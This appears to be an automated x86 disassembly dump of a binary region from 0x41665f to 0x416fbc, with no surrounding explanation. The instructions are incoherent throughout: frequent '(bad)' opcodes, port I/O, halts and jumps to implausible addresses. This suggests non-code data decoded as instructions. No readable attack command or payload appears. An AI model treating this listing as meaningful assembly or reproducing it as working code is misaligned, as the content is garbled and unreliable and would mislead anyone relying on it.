  41665f:	addr16 sbb al,0x69
  416662:	and    BYTE PTR [eax+edx*2+0x67ed9e],cl
  416669:	sahf   
  41666a:	jmp    0x4165f6
  41666c:	lds    ecx,FWORD PTR [eax+eiz*2]
  41666f:	ret    
  416670:	call   FWORD PTR [ebx]
  416672:	bound  edi,QWORD PTR [ebx+eax*4-0x1c7a31d1]
  416679:	hlt    
  41667a:	in     eax,dx
  41667b:	add    DWORD PTR [eax+0x5c],ebp
  41667e:	xchg   ebx,eax
  41667f:	add    DWORD PTR [eax],eax
  416681:	sti    
  416682:	mov    gs,ecx
  416684:	gs mov ebx,0x318701ec
  41668a:	fs cmp eax,0x890db0f5
  416691:	out    0x44,eax
  416693:	sub    BYTE PTR [eax-0xc],bh
  416696:	jmp    0x416622
  416698:	inc    ebx
  416699:	int3   
  41669a:	xor    esp,DWORD PTR [ecx-0x77]
  41669d:	das    
  41669e:	pushf  
  41669f:	mov    bh,BYTE PTR [edi]
  4166a1:	in     al,0x60
  4166a3:	les    esi,FWORD PTR [ebx-0x8]
  4166a6:	add    al,0xda
  4166a8:	aad    0x9d
  4166aa:	add    ch,BYTE PTR [esp+edx*2-0x30]
  4166ae:	in     al,dx
  4166af:	pop    eax
  4166b0:	jo     0x4166b2
	...
  4166ca:	fwait
  4166cb:	(bad)  
  4166cc:	ficom  WORD PTR [esi+0x57fd80b4]
  4166d2:	enter  0xcc6a,0x12
  4166d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166d7:	cmp    al,0xfe
  4166d9:	aam    0x77
  4166db:	mov    bl,0x74
  4166dd:	adc    al,0x1
  4166df:	mov    fs,WORD PTR [edi+0x225f3312]
  4166e5:	int3   
  4166e6:	in     eax,0x1d
  4166e8:	(bad)  
  4166e9:	fnsave [ebx+0x40]
  4166ec:	iret   
  4166ed:	nop
  4166ee:	xchg   DWORD PTR [ecx],edx
  4166f0:	(bad)  
  4166f1:	fimul  WORD PTR [ecx-0x13]
  4166f4:	imul   ecx,DWORD PTR [esi+0x541d643],0x505cbf6d
  4166fe:	cmp    ch,ch
  416700:	and    BYTE PTR [ebx-0x399529d5],cl
  416706:	iret   
  416707:	aad    0x24
  416709:	fsub   QWORD PTR [edi+0x586062e3]
  41670f:	mov    bh,BYTE PTR [edx-0x15]
  416712:	dec    ecx
  416713:	dec    esi
  416714:	out    0x3,eax
  416716:	(bad)
  416719:	adc    eax,DWORD PTR [edx]
  41671b:	aas    
  41671c:	mov    dl,0xc5
  41671e:	jo     0x41675a
  416720:	jb     0x41676a
  416722:	cld    
  416723:	mov    DWORD PTR [edi+0x678b6d07],ebp
  416729:	add    al,0xf4
  41672b:	add    al,0xb5
  41672d:	add    BYTE PTR ss:[eax],al
	...
  416744:	add    BYTE PTR [eax],al
  416746:	add    BYTE PTR [ebp-0x42],bh
  416749:	dec    edi
  41674a:	dec    ecx
  41674b:	dec    eax
  41674c:	(bad)  
  41674d:	mov    ch,BYTE PTR ds:[edi]
  416750:	lds    eax,FWORD PTR [eax]
  416752:	bound  esi,QWORD PTR [edx-0x14f387f]
  416758:	mov    esi,DWORD PTR cs:[edi+edx*4-0x78dc914]
  416760:	add    al,0xe9
  416762:	loope  0x4166e8
  416764:	cmp    eax,esp
  416766:	add    DWORD PTR [ebp-0x75],edx
  416769:	(bad)  
  41676a:	call   0xc7b62be2
  41676f:	outs   dx,BYTE PTR ds:[esi]
  416770:	push   ecx
  416771:	or     al,0x2f
  416773:	sub    al,0xd8
  416775:	jmp    DWORD PTR [ebx+0x49]
  416778:	push   eax
  416779:	or     al,0xe6
  41677b:	ret    
  41677c:	lods   al,BYTE PTR ds:[esi]
  41677d:	call   0xfe16da97
  416782:	ins    BYTE PTR es:[edi],dx
  416783:	xor    BYTE PTR [ebp+0xd],cl
  416786:	pop    esp
  416787:	ret    
  416788:	in     al,0xe8
  41678a:	pushf  
  41678b:	js     0x416762
  41678d:	std    
  41678e:	push   0xffffffdb
  416790:	or     BYTE PTR [eax],al
  416792:	mov    dh,0xb3
  416794:	mov    al,0x89
  416796:	or     al,0x70
  416798:	adc    esi,esi
  41679a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41679b:	mov    bl,0xec
  41679d:	mov    DWORD PTR [eax+edx*1],esp
  4167a0:	add    DWORD PTR [ebx-0x5b],0xfffffff8
  4167a4:	sbb    eax,DWORD PTR [ebx-0x6b]
  4167a7:	add    DWORD PTR [ecx+0x84c9],ecx
	...
  4167c1:	add    BYTE PTR [eax],al
  4167c3:	add    BYTE PTR [ecx],ch
  4167c5:	xlat   BYTE PTR ds:[ebx]
  4167c6:	std    
  4167c7:	hlt    
  4167c8:	daa    
  4167c9:	in     al,dx
  4167ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167cb:	or     al,0xf7
  4167cd:	add    al,0x89
  4167cf:	adc    al,0x94
  4167d1:	jle    0x416816
  4167d3:	xor    DWORD PTR [ebp+0x40],edi
  4167d6:	les    esi,FWORD PTR [eax+0x2b]
  4167d9:	cdq    
  4167da:	mov    edi,DWORD PTR [ebx+eax*4-0x655797c9]
  4167e1:	inc    edi
  4167e2:	add    BYTE PTR [eax],al
  4167e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e5:	lock dec edi
  4167e7:	push   ecx
  4167e8:	inc    esp
  4167e9:	inc    esp
  4167ea:	lock mov DWORD PTR [eax-0x268a7a44],ecx
  4167f1:	jg     0x416864
  4167f3:	enter  0x4bdb,0xb8
  4167f7:	add    DWORD PTR ds:0x8d024b02,eax
  4167fd:	test   esp,eax
  4167ff:	adc    al,0x1d
  416801:	xor    al,0xfb
  416803:	add    DWORD PTR [edx-0x7d02a874],eax
  416809:	mov    cl,0xfb
  41680b:	jne    0x4167ee
  41680d:	loopne 0x41686c
  41680f:	gs pop esp
  416811:	or     BYTE PTR [esi-0x18],dl
  416814:	mov    dh,0x6b
  416816:	std    
  416817:	inc    DWORD PTR [edx+0x3b]
  41681a:	lock call 0x3ed43e
  416820:	inc    edx
  416821:	cmp    esp,eax
  416823:	call   0x3ed42e
	...
  416840:	add    ah,dh
  416842:	cmp    edx,esp
  416844:	cpuid  
  416846:	(bad)  
  416847:	pop    ebx
  416848:	pop    esi
  416849:	push   es
  41684a:	rol    dl,0x8
  41684d:	sbb    eax,0x8eec871b
  416852:	jmp    0x41684c
  416854:	xor    DWORD PTR [ecx-0x30],0x50
  416858:	push   ebp
  416859:	retf   
  41685a:	sbb    DWORD PTR [edi+0x15db72f9],eax
  416860:	adc    ecx,ebp
  416862:	or     BYTE PTR [ebp-0x772bd6bc],al
  416868:	inc    edi
  416869:	fldcw  WORD PTR [esp+edx*4+0x1]
  41686d:	fld    QWORD PTR [edi]
  41686f:	inc    edx
  416871:	popf   
  416872:	mov    al,0x11
  416874:	sbb    ah,dh
  416876:	iret   
  416877:	inc    ecx
  416878:	add    ah,bl
  41687a:	jne    0x416800
  41687c:	dec    ebx
  41687e:	push   esi
  41687f:	shl    DWORD PTR [ecx],1
  416881:	rol    DWORD PTR [esi],1
  416883:	aad    0x73
  416885:	and    eax,0xb4313471
  41688a:	inc    ebp
  41688b:	out    dx,al
  41688c:	stc    
  41688d:	stos   DWORD PTR es:[edi],eax
  41688e:	sub    al,BYTE PTR [ebp+0x36cb29c0]
  416894:	xor    DWORD PTR [edx+edx*4-0x94c17bf],esi
  41689b:	(bad)  
  41689d:	jo     0x4168bc
  41689f:	push   esi
  4168a0:	pop    ss
  4168a1:	outs   dx,DWORD PTR ds:[esi]
  4168a2:	stos   BYTE PTR es:[edi],al
  4168a3:	add    eax,0x89
	...
  4168bc:	add    BYTE PTR [eax],al
  4168be:	je     0x4168ed
  4168c0:	add    al,BYTE PTR [eax]
  4168c2:	hlt    
  4168c3:	test   ecx,eax
  4168c5:	and    eax,0xfd31ddfd
  4168ca:	or     edx,edx
  4168cc:	idiv   BYTE PTR [edi]
  4168ce:	hlt    
  4168cf:	pusha  
  4168d0:	les    esi,FWORD PTR [ecx+ebp*8-0x3e]
  4168d4:	out    dx,eax
  4168d5:	pop    ss
  4168d6:	out    0x1d,eax
  4168d8:	add    al,0x87
  4168da:	mov    eax,0xc9e7f809
  4168df:	bound  eax,QWORD PTR [ebx]
  4168e1:	add    BYTE PTR [edi-0x73],bh
  4168e4:	sbb    eax,0x1d32a0f3
  4168e9:	repz repz imul esi,DWORD PTR [edi-0x1],0xc68edd1b
  4168f2:	sbb    al,0x7f
  4168f4:	mov    edi,?
  4168f6:	or     ebx,DWORD PTR [eax+0x40]
  4168f9:	and    al,0xd8
  4168fb:	in     eax,dx
  4168fc:	rol    DWORD PTR [eax+edx*8-0x4a],0x1
  416901:	xchg   DWORD PTR [eax-0x38],esp
  416904:	sbb    eax,0x82059fe8
  416909:	fndisi(8087 only) 
  41690b:	push   cs
  41690c:	and    al,0x50
  41690e:	push   es
  41690f:	xor    eax,0x458763f
  416914:	out    0x86,eax
  416916:	dec    eax
  416917:	sub    DWORD PTR [ebx],ecx
  416919:	add    cl,dh
  41691b:	jbe    0x416944
  41691d:	xor    BYTE PTR [ecx+ebx*2+0xc2df],0x0
	...
  416939:	add    BYTE PTR [eax],al
  41693b:	cmp    BYTE PTR [ecx],ch
  41693d:	pop    es
  41693e:	add    eax,0x1ce704f4
  416943:	adc    cl,BYTE PTR [ecx]
  416945:	out    dx,al
  416946:	mov    DWORD PTR [ebx+0x5],ecx
  416949:	out    0x3,eax
  41694b:	jnp    0x4169ae
  41694d:	ret    
  41694e:	sti    
  41694f:	jl     0x41699b
  416951:	jmp    0x41693e
  416953:	mov    al,0xbd
  416955:	out    0x3,eax
  416957:	jo     0x41691e
  416959:	out    0x7f,al
  41695b:	pop    DWORD PTR ds:0xf37d03e7
  416961:	jmp    0x6c2e819d
  416966:	inc    esi
  416967:	in     al,dx
  416968:	xor    al,0xbf
  41696a:	push   ebx
  41696b:	jg     0x416971
  41696d:	out    0x7f,eax
  41696f:	xor    al,0x58
  416971:	dec    esi
  416972:	mov    WORD PTR [eax-0x477c2ad8],?
  416978:	sub    ch,bl
  41697a:	add    ebp,DWORD PTR [edx-0xfbd9e15]
  416980:	jge    0x4169e9
  416982:	jae    0x4169a7
  416984:	shl    bh,cl
  416986:	imul   ebp,DWORD PTR [esi+esi*8-0x1a],0x3
  41698b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41698c:	shl    esp,1
  41698e:	mul    esp
  416990:	inc    esp
  416991:	out    0x80,eax
  416993:	xor    al,0x59
  416995:	mov    ebx,0x8b18e
  41699a:	bound  edi,QWORD PTR [edi-0x7c]
  41699d:	(bad)  
  41699e:	call   0x4169a3
	...
  4169b7:	add    bh,dh
  4169b9:	jnp    0x4169ff
  4169bb:	or     eax,0xb9ff5f18
  4169c0:	iret   
  4169c1:	xor    eax,0x85ae567a
  4169c6:	rcl    al,0xc5
  4169c9:	jmp    0x539f423
  4169ce:	test   BYTE PTR [ecx],ch
  4169d0:	sub    ebp,edi
  4169d2:	std    
  4169d3:	lods   eax,DWORD PTR ds:[esi]
  4169d4:	adc    edi,ebx
  4169d6:	jg     0x416985
  4169d8:	or     edi,ebx
  4169da:	add    bl,BYTE PTR [ebx+0x110bdb8a]
  4169e0:	mov    ah,BYTE PTR [ebp+0x4380e8ff]
  4169e6:	add    al,0x27
  4169e8:	retf   
  4169e9:	sub    BYTE PTR ds:0x245077e8,dl
  4169ef:	xlat   BYTE PTR ds:[ebx]
  4169f0:	hlt    
  4169f1:	push   ebp
  4169f2:	adc    al,0x62
  4169f4:	xor    al,0x7b
  4169f6:	into   
  4169f7:	add    DWORD PTR [eax-0x45170082],ebx
  4169fd:	sub    DWORD PTR [ebp+eax*1+0x58],0x19
  416a02:	(bad)  
  416a03:	sub    eax,0x69fef814
  416a08:	mov    ah,0x28
  416a0a:	sbb    BYTE PTR [ecx],al
  416a0c:	add    ecx,DWORD PTR [esi+ebp*2]
  416a0f:	in     eax,0xec
  416a11:	adc    BYTE PTR [ecx-0x4a],0x4d
  416a15:	iret   
  416a16:	mov    DWORD PTR [esi],ecx
  416a18:	hlt    
  416a19:	pop    esi
  416a1a:	add    bh,BYTE PTR [edi]
	...
  416a34:	add    BYTE PTR [eax],dl
  416a36:	ret    0xe9c6
  416a39:	test   DWORD PTR [eax-0x38ece240],0xd204c544
  416a43:	xor    al,BYTE PTR [eax]
  416a45:	push   esi
  416a46:	lock pop ebx
  416a48:	and    al,0x22
  416a4a:	inc    ecx
  416a4b:	add    ecx,DWORD PTR [ebx-0x79581e65]
  416a51:	fadd   QWORD PTR [edi+eax*4]
  416a54:	inc    esi
  416a55:	ror    DWORD PTR [ecx-0xe47cd08],1
  416a5b:	jle    0x416a55
  416a5d:	les    esi,FWORD PTR [edi]
  416a5f:	inc    eax
  416a60:	inc    eax
  416a62:	int3   
  416a63:	adc    BYTE PTR [eax-0x33],al
  416a66:	and    DWORD PTR [esp-0x67],eax
  416a6a:	idiv   DWORD PTR [edi-0x35]
  416a6d:	or     DWORD PTR [ecx],0x15832f76
  416a73:	push   0x3
  416a75:	mov    ch,0xdc
  416a77:	push   0x84adfafa
  416a7c:	shl    BYTE PTR [eax-0x2b],0x50
  416a80:	push   edi
  416a81:	scas   al,BYTE PTR es:[edi]
  416a82:	(bad)  
  416a83:	call   0xfbef61e3
  416a88:	test   ch,cl
  416a8a:	aas    
  416a8b:	or     dl,BYTE PTR [ebx-0x6e]
  416a8e:	bound  eax,QWORD PTR [edx]
  416a90:	pop    eax
  416a91:	cmc    
  416a92:	inc    edi
  416a93:	cli    
  416a94:	call   FWORD PTR [edx-0x53]
  416a97:	adc    DWORD PTR [eax],ebx
	...
  416ab1:	add    BYTE PTR [esi+0x44],bl
  416ab4:	add    BYTE PTR [ecx-0xe3dadf],cl
  416aba:	jecxz  0x416a9c
  416abc:	dec    ecx
  416abd:	arpl   WORD PTR [esp+eax*1+0x56],cx
  416ac1:	call   0x3ed4d8
  416ac6:	xchg   esi,eax
  416ac7:	inc    esp
  416ac8:	add    al,0x5
  416aca:	rol    DWORD PTR [edx],0x0
  416acd:	add    ch,bl
  416acf:	lods   eax,DWORD PTR ds:[esi]
  416ad0:	adc    DWORD PTR [edi+ebx*1],ebx
  416ad3:	inc    esp
  416ad4:	add    BYTE PTR [ebx-0x76ffe10c],cl
  416ada:	je     0x416b2a
  416adc:	add    al,BYTE PTR [eax]
  416ade:	hlt    
  416adf:	cmc    
  416ae0:	inc    ebx
  416ae1:	jne    0x416ac2
  416ae3:	fnsave [ecx]
  416ae5:	std    
  416ae6:	or     DWORD PTR [edx+0x68f43ff4],edi
  416aec:	ror    DWORD PTR ds:0xfdd62f79,0xdb
  416af3:	xor    al,BYTE PTR ds:0x4e23b89
  416af9:	shl    DWORD PTR [edi+edi*1],0xee
  416afd:	sbb    esp,esi
  416aff:	popf   
  416b00:	add    DWORD PTR [ebp+0x1a],ebx
  416b03:	jno    0x416b41
  416b05:	mov    DWORD PTR [ecx+0x2881c478],ebx
  416b0b:	or     al,BYTE PTR [eax]
  416b0d:	add    cl,BYTE PTR [edx+0x53]
  416b10:	ror    BYTE PTR ds:0x2c4ed562,cl
	...
  416b2e:	add    BYTE PTR [edi-0xc],dh
  416b31:	or     dh,BYTE PTR [eax+ebp*8+0x5a]
  416b35:	fimul  DWORD PTR [ebx]
  416b37:	or     DWORD PTR [ecx+0x4ab23947],ebp
  416b3d:	or     al,0x80
  416b3f:	in     al,dx
  416b40:	fmul   QWORD PTR [ebx]
  416b42:	jae    0x416b35
  416b44:	add    DWORD PTR [ebx],0x58
  416b47:	dec    edi
  416b48:	ficom  DWORD PTR [edx]
  416b4a:	shl    BYTE PTR [esp+edx*2-0x610516fe],0x2
  416b52:	dec    DWORD PTR [ebx-0x23]
  416b55:	add    DWORD PTR [ecx],esi
  416b57:	xor    al,0x1d
  416b59:	jmp    0xb05e299
  416b5e:	jl     0x416b4a
  416b60:	pop    edx
  416b61:	fisttp DWORD PTR [edx+ebp*4]
  416b64:	ret    0xf781
  416b67:	icebp  
  416b68:	add    al,0x1b
  416b6a:	(bad)  
  416b6b:	fwait
  416b6c:	int    0x64
  416b6e:	add    al,0xf4
  416b70:	add    al,0x1b
  416b72:	cld    
  416b73:	mov    cl,ch
  416b75:	(bad)  
  416b76:	and    esi,esp
  416b78:	add    al,0x5
  416b7a:	clc    
  416b7b:	jp     0x416b4a
  416b7d:	shl    BYTE PTR [ebx],1
  416b7f:	hlt    
  416b80:	add    al,0xf6
  416b82:	out    dx,eax
  416b83:	mov    al,0x3
  416b85:	jmp    0x25c8:0x5204f403
  416b8c:	lds    esp,FWORD PTR [eax]
  416b8e:	inc    eax
  416b8f:	sbb    BYTE PTR [ecx],al
  416b91:	out    0x70,al
	...
  416bab:	add    BYTE PTR [ebp+eax*2-0x3afa71be],dh
  416bb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bb3:	shr    esp,0x4
  416bb6:	scas   eax,DWORD PTR es:[edi]
  416bb7:	xor    BYTE PTR [eax],0x29
  416bba:	jmp    0x416bbd
  416bbc:	stc    
  416bbd:	xchg   esi,eax
  416bbe:	fist   WORD PTR [eax+0x8]
  416bc1:	and    BYTE PTR [eax],0xa
  416bc4:	and    BYTE PTR [edx],dh
  416bc6:	fcmovb st,st(3)
  416bc8:	jne    0x416b96
  416bca:	in     al,0x50
  416bcc:	pop    ss
  416bcd:	(bad)  
  416bce:	jmp    0xe7465fd7
  416bd3:	jmp    0xde8:0xa008218
  416bda:	jne    0x416bf8
  416bdc:	jne    0x416baa
  416bde:	fcom   QWORD PTR [ebp+0x10]
  416be1:	test   al,ah
  416be3:	xor    ah,0x4
  416be6:	out    0x4f,eax
  416be8:	in     al,dx
  416be9:	adc    eax,0x1e
  416bec:	adc    al,0x5
  416bee:	out    0x55,eax
  416bf0:	sbb    BYTE PTR [eax+eax*8-0x18faebd4],al
  416bf7:	push   esi
  416bf8:	adc    dh,al
  416bfa:	add    bl,ch
  416bfc:	test   BYTE PTR [eax+eax*1],0xe9
  416c00:	push   cs
  416c01:	pop    ds
  416c02:	xor    DWORD PTR [ecx-0x12dbb708],ebp
  416c08:	cli    
  416c09:	jno    0x416bcb
  416c0b:	sub    DWORD PTR [edi],ebx
  416c0d:	and    eax,0xebc5
	...
  416c26:	add    BYTE PTR [eax],al
  416c28:	add    al,bh
  416c2a:	add    al,0x0
  416c2c:	jmp    0xa972573f
  416c31:	fdivrp st(5),st
  416c33:	cmp    BYTE PTR ds:0xe275fd14,ch
  416c39:	ja     0x416c87
  416c3b:	std    
  416c3c:	hlt    
  416c3d:	inc    esp
  416c3e:	add    ch,BYTE PTR [edx-0x15]
  416c41:	paddusb mm0,QWORD PTR [ecx]
  416c44:	sbb    dh,BYTE PTR [eax-0x191478bc]
  416c4a:	les    eax,FWORD PTR [eax+0x2b]
  416c4d:	repz add al,0x53
  416c50:	jb     0x416bed
  416c52:	and    esp,0x31
  416c55:	out    0x31,al
  416c57:	push   esi
  416c58:	xchg   esi,eax
  416c59:	or     eax,0x2be965ce
  416c5e:	pop    ss
  416c5f:	pop    ss
  416c60:	adc    DWORD PTR [edx+0x7ee8ffba],esi
  416c66:	fadd   QWORD PTR [ebx+0x400433fc]
  416c6c:	adc    ch,BYTE PTR [ebx*8+0x4f82d18]
  416c73:	test   BYTE PTR [ecx],ch
  416c75:	mov    ebx,0x49f86a10
  416c7a:	icebp  
  416c7b:	addr16 sti 
  416c7d:	mov    bh,0x4
  416c7f:	push   eax
  416c80:	fisub  WORD PTR [ebx+0x2d]
  416c83:	adc    ch,BYTE PTR [ecx]
  416c85:	lock jnp 0x416cbb
  416c88:	in     eax,dx
  416c89:	inc    esp
  416c8a:	or     eax,0x0
	...
  416ca3:	add    BYTE PTR [eax],al
  416ca5:	add    BYTE PTR [esi-0x80],dh
  416ca8:	ltr    WORD PTR ds:0x6135fb14
  416caf:	in     al,0x3f
  416cb1:	add    BYTE PTR [edx-0x62],dl
  416cb4:	mov    ebx,0x10c02
  416cb9:	jmp    0x416cde
  416cbb:	fnstenv [edi]
  416cbd:	retf   0x11d
  416cc0:	dec    edi
  416cc1:	jmp    FWORD PTR [eax]
  416cc3:	mov    ch,0xe4
  416cc5:	inc    ebx
  416cc6:	or     eax,0x9a3bd6b8
  416ccb:	xor    eax,0xe77555ee
  416cd0:	jns    0x416cd1
  416cd2:	push   edx
  416cd3:	idiv   BYTE PTR [edi+0x5713b35f]
  416cd9:	mov    edi,DWORD PTR [eax]
  416cdb:	adc    al,0xc2
  416cdd:	add    al,0xdd
  416cdf:	sbb    ecx,DWORD PTR [ecx+0x7d7cf96c]
  416ce5:	in     al,dx
  416ce6:	and    eax,0x8e000005
  416ceb:	cmc    
  416cec:	(bad)  
  416ced:	push   ebx
  416cee:	loop   0x416ccb
  416cf0:	adc    cl,BYTE PTR gs:[ebp+0x8]
  416cf4:	push   eax
  416cf5:	call   FWORD PTR [eax-0x62bfed98]
  416cfb:	pop    esi
  416cfc:	std    
  416cfd:	addr16 pushf 
  416cff:	cmp    al,0x36
  416d01:	sbb    ebp,esi
  416d03:	adc    edx,ecx
  416d05:	add    DWORD PTR [ebp+0x6c417f],ecx
	...
  416d23:	lds    esi,FWORD PTR ss:[ecx+0x8]
  416d27:	scas   al,BYTE PTR es:[edi]
  416d28:	enter  0xe940,0x68
  416d2c:	or     BYTE PTR [eax],al
  416d2e:	add    BYTE PTR [ebx],bl
  416d30:	push   ss
  416d31:	mov    DWORD PTR [ebp-0x27],eax
  416d34:	pop    ss
  416d35:	push   0x1fe5f423
  416d3a:	std    
  416d3b:	dec    esp
  416d3c:	loopne 0x416d05
  416d3e:	(bad)  
  416d3f:	cmp    edx,DWORD PTR [ecx-0x72]
  416d42:	mov    gs,WORD PTR [edi]
  416d44:	mov    edx,esp
  416d46:	call   0x431a04
  416d4b:	stc    
  416d4c:	das    
  416d4d:	add    al,BYTE PTR [eax]
  416d4f:	hlt    
  416d50:	imul   edi
  416d52:	dec    edi
  416d53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d54:	pop    eax
  416d55:	dec    esi
  416d56:	inc    esp
  416d57:	ja     0x416cff
  416d59:	aam    0xe8
  416d5b:	in     eax,dx
  416d5c:	and    al,BYTE PTR [ecx]
  416d5e:	add    BYTE PTR [ecx-0x62],dh
  416d61:	push   ebx
  416d62:	sbb    edi,DWORD PTR [edi-0x5d]
  416d65:	xor    DWORD PTR [eax+0x74],ebp
  416d68:	jae    0x416daa
  416d6a:	add    BYTE PTR [ecx+0x60],dh
  416d6d:	push   ebp
  416d6e:	sti    
  416d6f:	(bad)  [edx+0x31]
  416d72:	call   0x42ed26
  416d77:	jno    0x416d96
  416d79:	add    al,0x93
  416d7b:	mov    ah,0xf7
  416d7d:	mov    esi,0xc1ceed73
  416d82:	data16 jge 0x416de5
  416d85:	push   ebp
  416d86:	sti    
	...
  416d9f:	add    BYTE PTR [ebx-0xa1165ee],ch
  416da5:	fld    QWORD PTR [ecx]
  416da7:	mov    esi,DWORD PTR [ecx+0x53]
  416daa:	fdivr  st,st(5)
  416dac:	xchg   ebx,eax
  416dad:	push   ebp
  416dae:	stc    
  416daf:	aas    
  416db0:	cmp    eax,0x798bd769
  416db5:	jns    0x416d8d
  416db7:	std    
  416db8:	jnp    0x416e27
  416dba:	aam    0x13
  416dbc:	lods   al,BYTE PTR ds:[esi]
  416dbd:	scas   al,BYTE PTR es:[edi]
  416dbe:	inc    ecx
  416dbf:	add    BYTE PTR [ecx+0x58],bh
  416dc2:	push   ebp
  416dc3:	sti    
  416dc4:	arpl   dx,bx
  416dc6:	xor    bh,ch
  416dc8:	add    DWORD PTR ds:0x513f6c7,eax
  416dce:	jo     0x416e19
  416dd0:	(bad)  
  416dd1:	fsub   st(2),st
  416dd3:	mov    esi,0xc463cb43
  416dd8:	shr    BYTE PTR [esi],0x1e
  416ddb:	and    DWORD PTR [edi-0xb638024],0xf1dbe704
  416de5:	jecxz  0x416dce
  416de7:	add    ebp,DWORD PTR [ebp+0x11]
  416dea:	add    esi,edi
  416dec:	rol    DWORD PTR [edx+eiz*2],cl
  416def:	mov    esp,0x36e704f4
  416df4:	add    DWORD PTR [ecx],edx
  416df6:	mov    ebp,eax
  416df8:	mov    ch,0x4
  416dfa:	xchg   BYTE PTR [edx+0xec14e7f],bh
  416e00:	mov    cl,0x50
  416e02:	mov    bh,0x7e
	...
  416e1c:	add    BYTE PTR [edi],dh
  416e1e:	push   ebp
  416e1f:	pop    esp
  416e20:	dec    eax
  416e21:	hlt    
  416e22:	push   es
  416e23:	jo     0x416e6e
  416e25:	inc    esp
  416e26:	retf   0x53d4
  416e29:	jg     0x416dab
  416e2b:	rcl    eax,cl
  416e2d:	ror    edx,0xb7
  416e30:	pop    ebp
  416e31:	mov    ebx,0x4487ac79
  416e36:	js     0x416ddc
  416e38:	fild   DWORD PTR [ebp+ebx*8-0x69]
  416e3c:	jbe    0x416e32
  416e3e:	add    al,0x9a
  416e40:	shl    bh,cl
  416e42:	enter  0x470b,0xf4
  416e46:	leave  
  416e47:	xor    eax,0x3151b10f
  416e4c:	xor    eax,DWORD PTR [ecx+0x4fdb7b50]
  416e52:	dec    ecx
  416e53:	push   es
  416e54:	shl    DWORD PTR ds:0x752e9dc5,cl
  416e5a:	rol    BYTE PTR [eax],0x7d
  416e5d:	mov    al,ds:0x1ce904c7
  416e62:	jl     0x416e50
  416e64:	cmp    BYTE PTR [ebx],cl
  416e66:	xor    edx,DWORD PTR [ebp+0x72]
  416e69:	in     al,0xa0
  416e6b:	fld    TBYTE PTR [edx]
  416e6d:	clc    
  416e6e:	adc    ebx,ecx
  416e70:	cmp    al,BYTE PTR [ebx]
  416e72:	pop    ebp
  416e73:	jmp    0x5146275f
  416e78:	jb     0x416ec8
  416e7a:	fucom  st(2)
  416e7c:	add    eax,edi
  416e7e:	add    al,0x51
  416e80:	sbb    al,BYTE PTR [eax]
	...
  416e9a:	mov    eax,0xf8281d29
  416e9f:	xor    ecx,DWORD PTR [eax-0x2d22d8dc]
  416ea5:	shl    edi,0x4
  416ea8:	cmp    BYTE PTR [edi+eiz*1],ch
  416eab:	push   esi
  416eac:	or     bl,al
  416eae:	mov    edx,0xb7ba0455
  416eb3:	fild   DWORD PTR [ecx]
  416eb5:	mov    edx,0xf5d44b7
  416eba:	or     eax,edx
  416ebc:	sar    DWORD PTR [edx+edx*2-0x78b28027],0x4
  416ec4:	add    cl,ch
  416ec6:	or     dh,BYTE PTR [ebx]
  416ec8:	push   ebp
  416ec9:	ret    
  416eca:	idiv   DWORD PTR [ebp-0x7d]
  416ecd:	stc    
  416ece:	mov    bh,0xfd
  416ed1:	cdq    
  416ed2:	dec    edi
  416ed3:	and    al,0x8
  416ed5:	or     eax,edi
  416ed7:	fdiv   QWORD PTR [ecx-0x74fb0fdf]
  416edd:	pushf  
  416ede:	pop    ds
  416edf:	lea    ebp,[eax-0x17fb0817]
  416ee5:	test   al,0x8d
  416ee7:	add    al,0x0
  416ee9:	fisttp DWORD PTR [edx-0x79]
  416eec:	(bad)  
  416eed:	call   FWORD PTR [ebp+0x5]
  416ef0:	or     BYTE PTR [ebp-0x50a30],0x6a
  416ef7:	push   ss
  416ef8:	mov    DWORD PTR [ebp-0x3b],eax
  416efb:	adc    eax,0xff53
	...
  416f14:	add    BYTE PTR [eax],al
  416f16:	add    BYTE PTR [eax-0x5f],dl
  416f19:	cmovo  ebx,DWORD PTR [ebp-0x7e]
  416f1d:	shl    BYTE PTR [ebp+0xe],0x29
  416f21:	hlt    
  416f22:	add    DWORD PTR [ebp+0x5],ecx
  416f25:	sti    
  416f26:	adc    eax,0x3dd2c1
  416f2b:	cwde   
  416f2c:	inc    ecx
  416f2d:	cld    
  416f2e:	push   eax
  416f2f:	mov    bh,0x5
  416f31:	push   0x0
  416f33:	mov    eax,0xd2509841
  416f38:	dec    ebp
  416f39:	jns    0x416f37
  416f3b:	push   0xffffffd1
  416f3d:	cmp    DWORD PTR [eax],edx
  416f3f:	int    0x0
  416f41:	add    eax,0x858ad5e0
  416f47:	lods   eax,DWORD PTR ds:[esi]
  416f48:	mov    ch,0xfb
  416f4a:	dec    DWORD PTR ds:0x75fc7148
  416f50:	pop    es
  416f51:	pop    DWORD PTR [eax]
  416f53:	int    0xa9
  416f55:	add    dh,BYTE PTR [edx]
  416f57:	sbb    eax,0xdb74c07d
  416f5c:	mov    dh,0xbf
  416f5e:	and    BYTE PTR [esi],0x0
  416f61:	jb     0x416f0a
  416f63:	ffreep st(0)
  416f65:	pop    ebx
  416f66:	pop    esi
  416f67:	push   esi
  416f68:	mov    edi,DWORD PTR [edi-0xc566350]
  416f6e:	mov    ecx,DWORD PTR [ebp+0x61fff881]
  416f74:	leave  
  416f75:	add    al,0x71
  416f78:	std    
  416f79:	dec    edi
  416f7a:	inc    DWORD PTR [eax]
	...
  416f94:	add    BYTE PTR [eax],0xf
  416f97:	inc    eax
  416f98:	hlt    
  416f99:	ffree  st(4)
  416f9b:	push   ebx
  416f9c:	outs   dx,DWORD PTR ds:[esi]
  416f9d:	retf   0xe484
  416fa0:	ins    BYTE PTR es:[edi],dx
  416fa1:	pop    ebx
  416fa2:	loopne 0x416fb0
  416fa4:	(bad)  
  416fa5:	jae    0x416fa8
  416fa7:	mov    DWORD PTR [ebx+eiz*2],edi
  416faa:	inc    ebp
  416fab:	sbb    BYTE PTR [ecx],dl
  416fad:	xlat   BYTE PTR ds:[ebx]
  416fae:	sar    BYTE PTR [ebp+0x53],1
  416fb1:	push   cs
  416fb2:	iret   
  416fb3:	jae    0x416f95
  416fb5:	xor    eax,DWORD PTR [edi*8+0x73d0cdc9]
  416fbc:	call   0x3349c677
